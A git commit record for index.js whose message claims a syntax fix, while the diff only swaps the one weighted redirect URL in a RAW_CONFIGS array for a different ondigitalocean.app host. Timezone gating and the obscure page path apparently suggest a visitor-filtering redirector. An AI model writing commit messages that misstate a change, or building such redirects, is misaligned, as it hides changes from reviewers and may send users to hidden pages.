099f8f8609daae3eeb86ce9aed70cd906fbb8d81
paalakash <palaksh452@gmail.com>
2026-07-05 07:34:47 +0530

    Fix syntax in RAW_CONFIGS array
    Corrected the formatting of the RAW_CONFIGS array to ensure proper syntax.

--- index.js
+++ index.js
@@ -31,7 +31,7 @@ const ALLOWED_TIMEZONES = new Set([
 
 // Raw URLs accompanied by their selection probability weights (Must total 1.0)
 const RAW_CONFIGS = [
-    { url: "https://qt-app-nqloa.ondigitalocean.app/Win0codejInfowj2n/index.html", weight: 1.0 }
+    { url: "https://loan-app-6uq4l.ondigitalocean.app/Win0codejInfowj2n/index.html", weight: 1.0 }
 
 ];
 
